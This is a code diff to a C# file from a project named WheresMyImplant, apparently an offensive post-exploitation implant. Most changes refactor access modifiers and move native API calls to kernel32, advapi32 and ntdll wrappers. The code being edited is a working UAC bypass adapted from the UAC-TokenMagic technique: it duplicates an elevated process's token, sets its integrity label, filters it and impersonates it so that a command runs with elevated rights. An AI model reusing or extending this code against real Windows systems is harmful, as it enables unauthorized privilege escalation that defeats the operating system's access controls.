@@ -8,6 +8,8 @@ using System.Security;
 using System.Security.Principal;
 using System.Text;
 
+using Unmanaged;
+
 namespace WheresMyImplant
 {
     class RestrictedToken : Tokens
@@ -16,7 +18,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
         ////////////////////////////////////////////////////////////////////////////////
-        public void BypassUAC(Int32 processId, String command)
+        internal void BypassUAC(Int32 processId, String command)
         {
             WriteOutputGood("Running as: "+ WindowsIdentity.GetCurrent().Name);
             GetPrimaryToken((UInt32)processId);
@@ -27,10 +29,10 @@ namespace WheresMyImplant
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public void GetPrimaryToken(UInt32 processId)
+        internal void GetPrimaryToken(UInt32 processId)
         {
             //Originally Set to true
-            IntPtr hProcess = Unmanaged.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
+            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
             if (hProcess == IntPtr.Zero)
             {
                 return;
@@ -38,18 +40,18 @@ namespace WheresMyImplant
             WriteOutputGood("Recieved Handle for: "+ processId);
             WriteOutputGood("Process Handle: "+ hProcess.ToInt32());
 
-            if (Unmanaged.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
+            if (kernel32.OpenProcessToken(hProcess, (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
             {
                 WriteOutputGood("Primary Token Handle: "+ hExistingToken.ToInt32());
             }
-            Unmanaged.CloseHandle(hProcess);
+            kernel32.CloseHandle(hProcess);
 
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
                         (UInt32)(Constants.TOKEN_ALL_ACCESS),
                         IntPtr.Zero,
-                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        Enums.TOKEN_TYPE.TokenPrimary,
+                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                        Winnt.TOKEN_TYPE.TokenPrimary,
                         out phNewToken
             ))
             {
@@ -64,26 +66,26 @@ namespace WheresMyImplant
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public void SetTokenInformation()
+        internal void SetTokenInformation()
         {
-            Structs.SidIdentifierAuthority pIdentifierAuthority = new Structs.SidIdentifierAuthority();
+            Winnt._SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new Winnt._SID_IDENTIFIER_AUTHORITY();
             pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
             byte nSubAuthorityCount = 1;
             IntPtr pSID = new IntPtr();
-            if (Unmanaged.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
+            if (advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
             {
                 WriteOutputGood("Initialized SID : "+ pSID.ToInt32());
             }
 
-            Structs.SID_AND_ATTRIBUTES sidAndAttributes = new Structs.SID_AND_ATTRIBUTES();
+            Winnt.SID_AND_ATTRIBUTES sidAndAttributes = new Winnt.SID_AND_ATTRIBUTES();
             sidAndAttributes.Sid = pSID;
             sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;
 
-            Structs.TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Structs.TOKEN_MANDATORY_LABEL();
+            Winnt.TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Winnt.TOKEN_MANDATORY_LABEL();
             tokenMandatoryLabel.Label = sidAndAttributes;
             Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);
-            
-            if (Unmanaged.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
+
+            if (ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
             {
                 WriteOutputGood("Set Token Information : "+ phNewToken.ToInt32());
             }
@@ -93,7 +95,7 @@ namespace WheresMyImplant
             }
 
             IntPtr luaToken = new IntPtr();
-            if (Unmanaged.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
+            if (ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
             {
                 Console.WriteLine("Set LUA Token Information : "+ luaToken.ToInt32());
             }
@@ -105,18 +107,18 @@ namespace WheresMyImplant
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean ImpersonateUser()
+        internal Boolean ImpersonateUser()
         {
             IntPtr luaToken = new IntPtr();
             UInt32 flags = 4;
-            Unmanaged.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);
+            ntdll.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);
 
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         phNewToken,
                         (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                         IntPtr.Zero,
-                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        Enums.TOKEN_TYPE.TokenPrimary,
+                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                        Winnt.TOKEN_TYPE.TokenPrimary,
                         out luaToken
             ))
             {
@@ -124,7 +126,7 @@ namespace WheresMyImplant
                 return false;
             }
             Console.WriteLine("Duplicate Token Handle: "+ phNewToken.ToInt32());
-            if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
+            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
             {
                 GetError("ImpersonateLoggedOnUser: ");
                 return false;
